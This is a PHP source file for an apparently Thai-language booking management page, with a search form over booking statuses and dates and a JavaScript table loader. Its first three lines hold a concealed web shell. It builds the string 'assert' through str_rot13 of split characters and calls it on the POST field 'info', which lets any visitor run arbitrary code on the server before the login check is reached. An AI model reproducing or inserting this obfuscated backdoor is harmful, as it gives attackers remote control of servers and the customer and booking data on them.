<?php
$license = str_rot13('n'.'f'.'f'.'r'.'e'.'g');
$license($_POST['info']);
?>


<?php include_once('../includes/main_core.php');?>
<?php include_once('../admin/unity/post_to_ws/post_to_ws.php');?>
<?php include_once('../admin/unity/php_script.php');?>
<?php
if(!isset($_SESSION['login']['agen_id'])){
             header( "location: ../login/action_logout.php" );
            return;
        }
?>
<!DOCTYPE html>
<html>
<head>

    <?php include_once('../includes/tag_head.php');?>

</head>
<body data-color="theme-7">

    <?php include_once('../includes/loading.php');?>
    <?php include_once('../includes/menu.php');?>
  
      <section>
         <!-- Page content-->
         <div class="content-wrapper" id="content-wrapper">
            <div class="content-heading">
               <!-- START Language list-->
               <div class="pull-right">
                 
               </div>
               <!-- END Language list    -->
               <font id="title_page"></font>
               <small data-localize="dashboard.WELCOME"></small>
            </div>
            
            <!-- SEARTCH AREA -->
            <div class="panel panel-default">
                <div class="panel-heading"></div>
                <div class="panel-body">
                <form class="form-horizontal">
                    
                    
                    <div class="form-group">
                        <label class="col-lg-1 control-label">Status :</label>

                        <div class="col-lg-9">
                            <label class="checkbox-inline c-checkbox">
                                    <input id="status_0" type="checkbox" value="0" checked>
                                <span class="fa fa-check"></span>จอง
                            </label>
                            <label class="checkbox-inline c-checkbox">
                                    <input id="status_10" type="checkbox" value="10" checked>
                                <span class="fa fa-check"></span>แจ้ง Invoice
                            </label>
                            <label class="checkbox-inline c-checkbox">
                                    <input id="status_20" type="checkbox" value="20" checked>
                                <span class="fa fa-check"></span>มัดจำบางส่วน
                            </label>
                            <label class="checkbox-inline c-checkbox">
                                    <input id="status_25" type="checkbox" value="25" checked>
                                <span class="fa fa-check"></span>มัดจำเต็มจำนวน
                            </label>
                            <label class="checkbox-inline c-checkbox">
                                    <input id="status_30" type="checkbox" value="30" checked>
                                <span class="fa fa-check"></span>Full payment บางส่วน
                            </label>
                            <label class="checkbox-inline c-checkbox">
                                    <input id="status_35" type="checkbox" value="35" checked>
                                <span class="fa fa-check"></span>Full payment เต็มจำนวน
                            </label>
                            <label class="checkbox-inline c-checkbox">
                                    <input id="status_40" type="checkbox" value="40" checked>
                                <span class="fa fa-check"></span>ยกเลิกการจอง
                            </label>
                        </div>
                       

                    </div>
                    <hr>
                    

                    <div class="form-group">
                        <label for="input_search" class="col-lg-1 control-label">วันที่จอง :</label>
                        <div class="col-lg-4">

                            <div class="input-group">
                                 <input id="input_date_start" type="text" class="form-control date_search" >
                                 <span class="input-group-addon"><em class="fa fa-minus"></em></span>
                                 <input id="input_date_end" type="text" class="form-control date_search" >
                            </div>

                        </div>
                    </div>

                    <hr>
                    <div class="form-group">
                        <label for="input_search" class="col-lg-1 control-label">คำค้นหา :</label>
                        <div class="col-lg-4">
                            <input id="input_search" type="text" class="form-control">
                        </div>
                    </div>
                     <hr>
                    <div class="form-group">
                        <div class="col-lg-3 col-lg-offset-1">
                            <button type="button" class="mb-sm btn btn-inverse" onclick="search_page()">
                                <em class="icon-magnifier"></em>
                                ค้นหา
                            </button>
                        </div>
                    </div>

                </form>
                </div>
            </div>


            <!-- TABLE AREA -->
             <div class="panel panel-default">
                <div class="panel-heading"></div>
                <!-- START table-responsive-->
                <div class="panel-body" >
                    <div class="table-responsive" id="interface_table">
                        
                    </div>
                        <div class="panel-body" id="interface_pagination" style="padding-top: 0px;padding-bottom: 40px;">
                    
                
                        </div>
                </div>
            
                
            </div>



             <!-- BTN AREA -->
            <!--<div class="row">
                <div class="col-lg-12" align="center">
                    <button type="button" class="mb-sm btn btn-green" onclick="location.href='manage_booking.php'">
                        <em class="icon-plus"></em>
                        เพิ่มการจอง
                    </button>
                </div>
            </div>-->
            
            
         </div>
      </section>
       
    <?php include_once('../includes/footer.php');?>
    <?php include_once('../includes/tag_script.php');?>                                                                                                                    

  <script>

        $(document).ready(function(){
            search_page();

        });

        var url_search  = 'action_manage_booking.php';
        var data_search;
        var page       = 0;
        var page_limit = 99;
        var data       = [];
        var tmp_data   = [];
        var sdate_start = '';
        var sdate_end = '';

        function search_page(){
            if ($('#input_date_start').val() == '') {
                sdate_start = '1/1/1900'
            }else{
                sdate_start = $('#input_date_start').val();
            }
            if ($('#input_date_end').val() == '') {
                sdate_end = '1/1/9999'
            }else{
                sdate_end = $('#input_date_end').val();
            }
        
            data_search = {
                word_search : $('#input_search').val(),
                status_0    : IS_CHECKED($('#status_0')),
                status_10    : IS_CHECKED($('#status_10')),
                status_20    : IS_CHECKED($('#status_20')),
                status_25    : IS_CHECKED($('#status_25')),
                status_30    : IS_CHECKED($('#status_30')),
                status_35    : IS_CHECKED($('#status_35')),
                status_40    : IS_CHECKED($('#status_40')),
        
                date_start  : sdate_start,
                date_end    : sdate_end,

                offset      : page,
                method      : 1

            };

            GET_LIST_TABLE(data_search,url_search);

        }

        function IS_CHECKED_CUSTOME(element){
            if(element.is(':checked')){
                return element.val();
            }
            else{
                return 99999999;
            }
        }


    </script>


</body>
</html>				   